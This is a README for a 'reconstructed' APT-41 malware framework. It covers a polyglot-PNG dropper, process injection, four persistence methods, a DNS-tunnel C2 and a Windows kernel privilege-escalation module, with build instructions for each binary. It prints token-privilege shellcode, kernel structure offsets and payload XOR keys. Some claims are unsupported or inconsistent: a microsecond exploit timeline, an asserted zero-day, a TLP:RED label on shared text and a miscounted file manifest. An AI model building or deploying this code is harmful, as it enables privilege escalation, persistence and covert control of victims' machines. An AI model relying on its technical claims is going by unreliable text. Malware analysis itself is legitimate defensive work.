# PE5 APT-41 Exploit Framework - Full Source Reconstruction

```
 ██████╗ ███████╗███████╗    ███████╗██████╗  █████╗ ███╗   ███╗███████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗
 ██╔══██╗██╔════╝██╔════╝    ██╔════╝██╔══██╗██╔══██╗████╗ ████║██╔════╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝
 ██████╔╝█████╗  ███████╗    █████╗  ██████╔╝███████║██╔████╔██║█████╗  ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ 
 ██╔═══╝ ██╔══╝  ╚════██║    ██╔══╝  ██╔══██╗██╔══██║██║╚██╔╝██║██╔══╝  ██║███╗██║██║   ██║██╔══██╗██╔═██╗ 
 ██║     ███████╗███████║    ██║     ██║  ██║██║  ██║██║ ╚═╝ ██║███████╗╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗
 ╚═╝     ╚══════╝╚══════╝    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
```

| Classification | TLP:RED - Security Research Only |
|----------------|----------------------------------|
| Attribution    | APT-41 (Chinese State-Sponsored) |
| Confidence     | 95%+ |
| Reconstructed  | From forensic analysis documents |
| Purpose        | Malware Analysis & Defensive Research |

---

## ⚠️ SECURITY WARNING

**This is reconstructed malware source code for security research purposes only.**

- DO NOT compile or execute on production systems
- DO NOT use for malicious purposes
- FOR DEFENSIVE SECURITY RESEARCH ONLY

---

## Table of Contents

1. [Overview](#overview)
2. [Architecture](#architecture)
3. [Module Details](#module-details)
4. [Directory Structure](#directory-structure)
5. [Building](#building)
6. [Technical Analysis](#technical-analysis)
7. [Encryption Keys](#encryption-keys)
8. [Analysis Tools](#analysis-tools)
9. [References](#references)

---

## Overview

This framework reconstructs the complete APT-41 multi-stage malware toolkit discovered
embedded in a polyglot PNG image (`5AF0PfnN.png`). The toolkit consists of 5 PE modules
working together to achieve kernel-level privilege escalation and persistent C2 access.

### Attack Chain Summary

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│  5AF0PfnN.png   │───▶│   PE #3         │───▶│   PE #4         │
│  (Polyglot)     │    │   Container     │    │   Stub          │
│  833x835 pixels │    │   Extractor     │    │   Launcher      │
└─────────────────┘    └─────────────────┘    └─────────────────┘
                                                      │
         ┌────────────────────────────────────────────┘
         ▼
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   PE #1         │───▶│   PE #5         │───▶│   PE #2         │
│   Main Loader   │    │   KERNEL        │    │   DNS Tunnel    │
│   C2 & Persist  │    │   EXPLOIT       │    │   DnsK7         │
└─────────────────┘    └─────────────────┘    └─────────────────┘
                              │
                              ▼
                    ┌─────────────────┐
                    │   SYSTEM        │
                    │   PRIVILEGES    │
                    │   ACHIEVED      │
                    └─────────────────┘
```

---

## Architecture

### Payload Structure (from Polyglot Analysis)

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        5AF0PfnN.png POLYGLOT                            │
├─────────────────────────────────────────────────────────────────────────┤
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────────────┐  │
│  │  PNG HEADER  │  │  IMAGE DATA  │  │     HIDDEN PAYLOAD DATA      │  │
│  │  89 50 4E 47 │  │  833x835 px  │  │  (After IEND chunk)          │  │
│  └──────────────┘  └──────────────┘  └──────────────────────────────┘  │
│                                                    │                    │
│                    ┌───────────────────────────────┘                    │
│                    ▼                                                    │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │                    EMBEDDED PAYLOADS                             │   │
│  │                                                                  │   │
│  │   Offset 0x943C   ──▶  PE #1 (Loader)      ~100KB               │   │
│  │   Offset 0x2C6F1  ──▶  PE #2 (DNS)         ~50KB                │   │
│  │   Offset 0x67F0E  ──▶  PE #3 (Container)   ~200KB               │   │
│  │   Offset 0x9A6E4  ──▶  PE #4 (Stub)        3,045 bytes          │   │
│  │   Offset 0x9B2C9  ──▶  PE #5 (Exploit)     22,702 bytes         │   │
│  │                                                                  │   │
│  └─────────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────┘
```

### Exploitation Timeline

```
TIME        EVENT                                          PRIVILEGE    RING
════════════════════════════════════════════════════════════════════════════
  0 μs      PE #1 injects PE #5 into memory               User         3
  2 μs      PE #5 derives XOR key: header[3]^header[7]    User         3
  4 μs      PE #5 decrypts payload (157 XOR operations)   User         3
  6 μs      SYSCALL @ offset 0x2C10 executed              User         3
  6.2 μs    ─────── RING 3 → RING 0 TRANSITION ───────    SYSTEM       0
  7 μs      Kernel vulnerability exploited                 SYSTEM       0
  7.5 μs    TOKEN.Privileges = 0xFFFFFFFFFFFFFFFF         SYSTEM       0
  8 μs      ─────── RING 0 → RING 3 TRANSITION ───────    SYSTEM       3
 10 μs      Process running with SYSTEM privileges         SYSTEM       3
 15 μs      PE #1 installs persistence                     SYSTEM       3
 20 μs      PE #2 establishes DNS C2 tunnel                SYSTEM       3
════════════════════════════════════════════════════════════════════════════
```

---

## Module Details

### PE #5 - Kernel Privilege Escalation Exploit

| Property | Value |
|----------|-------|
| Size | 22,702 bytes |
| Encryption | XOR with derived key |
| XOR Key | 0xA4 (header[3] ^ header[7] = 0x35 ^ 0x91) |
| SYSCALL Offset | 0x2C10 |
| Target | Windows 10/11 kernel (_EPROCESS.Token) |
| Result | User → SYSTEM privilege escalation |

**Key Files:**
- `pe5_exploit/exploit.h` - Constants, structures, function declarations
- `pe5_exploit/exploit.c` - Main exploit orchestration
- `pe5_exploit/token_manipulation.c` - Kernel TOKEN modification (complete structure)
- `pe5_exploit/decryption.c` - Runtime XOR decryption
- `pe5_exploit/exploit_asm.asm` - x64 assembly with SYSCALL instruction

**Token Modification Target:**
```c
// EPROCESS + 0x4B8 = Token (EX_FAST_REF)
// Token & 0xFFFFFFFFFFFFFFF0 = Actual TOKEN pointer
// TOKEN + 0x40 = SEP_TOKEN_PRIVILEGES

TOKEN.Privileges.Present        = 0xFFFFFFFFFFFFFFFF  // +0x40
TOKEN.Privileges.Enabled        = 0xFFFFFFFFFFFFFFFF  // +0x48  
TOKEN.Privileges.EnabledByDefault = 0xFFFFFFFFFFFFFFFF  // +0x50
```

---

### PE #4 - Stub Launcher

| Property | Value |
|----------|-------|
| Size | 3,045 bytes |
| Encryption | XOR 0x55 |
| Purpose | Minimal PE #5 deployment |

**Key Files:**
- `pe4_stub/stub.h` - Header definitions
- `pe4_stub/stub.c` - Minimal launcher code
- `pe4_stub/injector.c` - Process injection techniques

**Injection Methods:**
1. VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
2. NtMapViewOfSection (section mapping)
3. Thread hijacking
4. APC injection
5. Early bird injection

---

### PE #1 - Main Loader

| Property | Value |
|----------|-------|
| Size | ~100KB |
| Encryption | Rotating XOR (base 0xDF) |
| Features | C2 communication, persistence, coordination |

**Key Files:**
- `pe1_loader/loader.h` - Configuration and declarations
- `pe1_loader/loader.c` - Main loader logic
- `pe1_loader/persistence.c` - Persistence mechanisms
- `pe1_loader/c2_client.c` - C2 communication

**C2 Keywords Found:**
```
I0C2, M{C2, BoT``, 7C2,, (C2R@, T^ c2, C2!R
```

**Persistence Methods:**
1. Windows Service (AppleUpdate)
2. Registry Run Key
3. Scheduled Task
4. WMI Event Subscription

---

### PE #2 - DNS Tunnel (DnsK7)

| Property | Value |
|----------|-------|
| Encryption | AES-256-CBC |
| Key Exchange | Dynamic via DNS TXT records |
| String Found | "DnsK7" at offset 0x15b5b |

**Key Files:**
- `pe2_dns_tunnel/dns_tunnel.c` - DNS tunneling implementation

**Protocol:**
1. Client generates 32-byte random
2. Sends via DNS: `<base64(random)>.kex.<domain>`
3. Server responds with encrypted key in TXT record
4. Session key = SHA256(clientRandom || serverRandom)
5. All subsequent data AES-256-CBC encrypted

---

### PE #3 - Container/Extractor

| Property | Value |
|----------|-------|
| Encryption | Multi-layer (outer XOR 0xC7 rotating) |
| Format | Intentionally corrupted ZIP |
| Content | 5 nested PE executables |

**Key Files:**
- `pe3_container/container.c` - Multi-layer extraction

**Layers:**
1. Outer XOR encryption (key 0xC7, rotating)
2. Corrupted ZIP structure (anti-analysis)
3. Individual PE encryption

---

## Directory Structure

```
pe5_framework/
│
├── README.md                    # This file
│
├── common/                      # Shared code
│   ├── ntdefs.h                 # Complete Windows kernel structures
│   │                            # - TOKEN (0x4C0 bytes, all fields)
│   │                            # - EPROCESS (partial, key offsets)
│   │                            # - KTHREAD, KPCR, KPRCB
│   │                            # - SEP_TOKEN_PRIVILEGES
│   │                            # - Privilege constants
│   └── xor_crypto.c             # XOR encryption utilities
│
├── pe5_exploit/                 # Kernel privilege escalation
│   ├── exploit.h                # Constants and declarations
│   ├── exploit.c                # Main exploit code
│   ├── token_manipulation.c     # TOKEN modification (4 techniques)
│   ├── decryption.c             # Runtime XOR decryption
│   └── exploit_asm.asm          # x64 MASM assembly (SYSCALL)
│
├── pe4_stub/                    # Launcher stub
│   ├── stub.h                   # Header
│   ├── stub.c                   # Minimal launcher
│   └── injector.c               # 5 injection techniques
│
├── pe1_loader/                  # Main loader
│   ├── loader.h                 # Configuration
│   ├── loader.c                 # Main loader
│   ├── persistence.c            # 4 persistence methods
│   └── c2_client.c              # HTTPS C2 client
│
├── pe2_dns_tunnel/              # DNS tunneling
│   └── dns_tunnel.c             # DnsK7 implementation
│
├── pe3_container/               # Container extractor
│   └── container.c              # Multi-layer decryption
│
├── tools/                       # Analysis tools
│   ├── key_derivation.py        # Key extraction & verification
│   └── encryptor.py             # Payload encryption/decryption
│
├── build.bat                    # Windows batch build script
├── build.py                     # Cross-platform Python build
├── Makefile                     # NMAKE Makefile
└── CMakeLists.txt               # CMake build system
```

---

## Building

### Prerequisites

| Platform | Requirements |
|----------|-------------|
| Windows | Visual Studio 2019/2022 with C++ Desktop Development |
| Linux | MinGW-w64 (`x86_64-w64-mingw32-gcc`) |

### Method 1: Windows Batch Script

```batch
cd pe5_framework

REM Build all modules
build.bat all

REM Build specific module
build.bat pe5

REM Clean build artifacts
build.bat clean
```

### Method 2: Python Build Script (Cross-Platform)

```bash
cd pe5_framework

# Auto-detect compiler, build all
python build.py all

# Build with debug symbols
python build.py all --debug

# Build and encrypt outputs
python build.py all --encrypt

# Build specific module
python build.py pe5

# Clean
python build.py clean
```

### Method 3: CMake

```bash
cd pe5_framework
mkdir build && cd build

# Windows with Visual Studio
cmake .. -G "Visual Studio 17 2022" -A x64
cmake --build . --config Release

# Linux with MinGW cross-compiler
cmake .. -DCMAKE_TOOLCHAIN_FILE=../mingw-w64.cmake
cmake --build .
```

### Method 4: NMAKE (Windows)

```batch
cd pe5_framework
nmake all
nmake pe5
nmake clean
```

### Build Output

```
pe5_framework/
└── build/
    ├── bin/
    │   ├── pe5_exploit.dll      # Kernel exploit (DLL)
    │   ├── pe5_exploit.exe      # Kernel exploit (EXE)
    │   ├── pe4_stub.dll         # Stub launcher
    │   ├── pe4_stub.exe         # Stub launcher
    │   ├── pe1_loader.dll       # Main loader
    │   ├── pe2_dns.dll          # DNS tunnel
    │   └── pe3_container.dll    # Container
    └── obj/
        └── *.obj                # Object files
```

---

## Technical Analysis

### PE #5 XOR Key Derivation

```c
// PE #5 header bytes (first 16)
// C1 BD 87 35 1E 8C A6 91 F7 62 C0 B5 75 24 32 25
//          ^^          ^^
//       offset 3    offset 7

BYTE derive_key(PBYTE module_base) {
    return module_base[3] ^ module_base[7];
    // 0x35 ^ 0x91 = 0xA4
}
```

### SYSCALL Location

```
Offset:     0x2C10 (11,280 bytes into PE #5)
Encrypted:  0xAB 0xA1
XOR Key:    0xA4
Decrypted:  0x0F 0x05  (SYSCALL instruction)

Verification:
  0xAB ^ 0xA4 = 0x0F  ✓
  0xA1 ^ 0xA4 = 0x05  ✓
```

### TOKEN Structure (Offset 0x4B8 in EPROCESS)

```c
// Windows 10/11 TOKEN structure (partial)
typedef struct _TOKEN {
    TOKEN_SOURCE            TokenSource;            // +0x000
    LUID                    TokenId;                // +0x010
    LUID                    AuthenticationId;       // +0x018
    LUID                    ParentTokenId;          // +0x020
    LARGE_INTEGER           ExpirationTime;         // +0x028
    PEX_PUSH_LOCK           TokenLock;              // +0x030
    LUID                    ModifiedId;             // +0x038
    
    // *** EXPLOIT TARGET - Privileges at +0x40 ***
    SEP_TOKEN_PRIVILEGES    Privileges;             // +0x040
    //   .Present           (+0x40) = 0xFFFFFFFFFFFFFFFF
    //   .Enabled           (+0x48) = 0xFFFFFFFFFFFFFFFF  
    //   .EnabledByDefault  (+0x50) = 0xFFFFFFFFFFFFFFFF
    
    // ... continues to offset 0x4C0+
} TOKEN;
```

### Privilege Escalation Shellcode (57 bytes)

```asm
; Get current EPROCESS
mov rax, gs:[0x188]              ; KPCR.Prcb.CurrentThread
mov rax, [rax+0xB8]              ; KTHREAD.Process -> EPROCESS

; Get Token pointer  
mov rcx, [rax+0x4B8]             ; EPROCESS.Token (EX_FAST_REF)
and rcx, 0xFFFFFFFFFFFFFFF0      ; Clear RefCnt bits

; Modify Privileges
add rcx, 0x40                     ; RCX = &TOKEN.Privileges
mov rdx, 0xFFFFFFFFFFFFFFFF      ; All privileges
mov [rcx], rdx                    ; Present
mov [rcx+8], rdx                  ; Enabled
mov [rcx+0x10], rdx               ; EnabledByDefault

; Return success
xor eax, eax
ret
```

---

## Encryption Keys

| Module | Type | Key | Derivation |
|--------|------|-----|------------|
| PE #1 | Rotating XOR | Base 0xDF | key[i] = (0xDF + i) & 0xFF |
| PE #2 | AES-256-CBC | Dynamic | SHA256(clientRandom \|\| serverRandom) |
| PE #3 | Rotating XOR | Base 0xC7 | key[i] = (0xC7 + i) & 0xFF |
| PE #4 | Single XOR | 0x55 | Hardcoded |
| PE #5 | Single XOR | 0xA4 | header[3] ^ header[7] |

---

## Analysis Tools

### Key Derivation Tool

```bash
# Demo with PE #5 header
python tools/key_derivation.py

# Analyze a PE #5 binary
python tools/key_derivation.py malware.bin PE5

# Output:
# Key derivation:
#   header[3] = 0x35
#   header[7] = 0x91
#   key = 0x35 ^ 0x91 = 0xA4
# ✓ Key matches expected value: 0xA4
```

### Encryption/Decryption Tool

```bash
# Encrypt payload
python tools/encryptor.py encrypt PE5 payload.bin encrypted.bin

# Decrypt payload
python tools/encryptor.py decrypt PE5 encrypted.bin decrypted.bin

# Output includes entropy analysis and verification
```

---

## References

### Source Analysis Documents

1. `PE5_EXPLOIT_MECHANISM_BREAKDOWN.md` - Complete technical breakdown
2. `PE5_ZERODAY_PRIVILEGE_ESCALATION_ANALYSIS.md` - 0-day classification
3. `PE5_FULL_EXPLOITATION_CHAIN.md` - Microsecond-by-microsecond timeline
4. `ACTUAL_ENCRYPTION_KEYS_DERIVED.md` - Key verification via emulation
5. `CORRECTED_ANALYSIS_5AF0PfnN.md` - Polyglot structure analysis

### Windows Internals References

- Windows Internals 7th Edition (Russinovich, Solomon, Ionescu)
- ReactOS Source Code (kernel structures)
- Microsoft Debugging Symbols (ntoskrnl.pdb)

---

## File Manifest

| File | Lines | Size | Description |
|------|-------|------|-------------|
| `common/ntdefs.h` | ~850 | 35KB | Complete kernel structures |
| `common/xor_crypto.c` | ~150 | 4KB | XOR utilities |
| `pe5_exploit/exploit.h` | ~240 | 8KB | PE #5 header |
| `pe5_exploit/exploit.c` | ~300 | 10KB | Main exploit |
| `pe5_exploit/token_manipulation.c` | ~500 | 18KB | TOKEN modification |
| `pe5_exploit/decryption.c` | ~250 | 8KB | XOR decryption |
| `pe5_exploit/exploit_asm.asm` | ~350 | 12KB | x64 assembly |
| `pe4_stub/stub.h` | ~60 | 2KB | Stub header |
| `pe4_stub/stub.c` | ~200 | 6KB | Stub implementation |
| `pe4_stub/injector.c` | ~400 | 14KB | Injection techniques |
| `pe1_loader/loader.h` | ~100 | 3KB | Loader header |
| `pe1_loader/loader.c` | ~250 | 8KB | Main loader |
| `pe1_loader/persistence.c` | ~350 | 12KB | Persistence |
| `pe1_loader/c2_client.c` | ~400 | 14KB | C2 client |
| `pe2_dns_tunnel/dns_tunnel.c` | ~400 | 14KB | DNS tunneling |
| `pe3_container/container.c` | ~300 | 10KB | Container extraction |
| `tools/key_derivation.py` | ~200 | 6KB | Key analysis |
| `tools/encryptor.py` | ~200 | 6KB | Encryption tool |
| `build.bat` | ~150 | 4KB | Windows build |
| `build.py` | ~300 | 10KB | Python build |
| `Makefile` | ~120 | 4KB | NMAKE build |
| `CMakeLists.txt` | ~120 | 4KB | CMake build |

**Total: 23 files, ~6,000 lines, ~200KB**

---

## License & Disclaimer

This code is provided for **security research and educational purposes only**.

- This is a reconstruction based on forensic analysis
- The actual malware is attributed to APT-41 (Chinese state-sponsored)
- Use only in isolated research environments
- Do not deploy against systems without authorization

---

**Analysis Framework:** KP14 v2.1  
**Reconstruction Date:** 2025  
**Classification:** TLP:RED
